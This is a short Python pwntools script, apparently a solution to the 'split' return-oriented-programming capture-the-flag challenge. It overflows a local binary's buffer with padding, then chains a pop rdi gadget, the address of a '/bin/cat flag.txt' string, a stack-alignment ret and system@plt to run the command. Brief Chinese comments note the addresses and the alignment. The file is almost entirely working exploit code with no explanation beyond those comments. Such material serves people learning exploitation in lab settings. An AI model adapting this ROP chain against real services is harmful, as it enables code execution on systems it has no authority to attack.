from pwn import * 
from pwn import p64
import socket

context(arch='amd64',os = 'linux', log_level='DEBUG')
r = process("./split")

data_string = 0x00601060
pop_rdi = 0x004007c3

# addr_system = 0x040074B #正确的 call system的函数
# payload = b'A'*0x20 + b"junkjunk" +p64(pop_rdi)+ p64(data_string) + p64(addr_system)
retn_addr = 0x00400752
addr_system = 0x400560 #system的plt地址
payload = b'A'*0x20 + b"junkjunk" +p64(pop_rdi)+ p64(data_string) +p64(retn_addr)+ p64(addr_system) #16字节对齐 + ret


pause()





r.sendlineafter(b"> ",payload)

r.interactive()

# addr system .plt_addr = 0x080483e0
#.data string '/bin/cat flag.txt' = 0x0804A030 

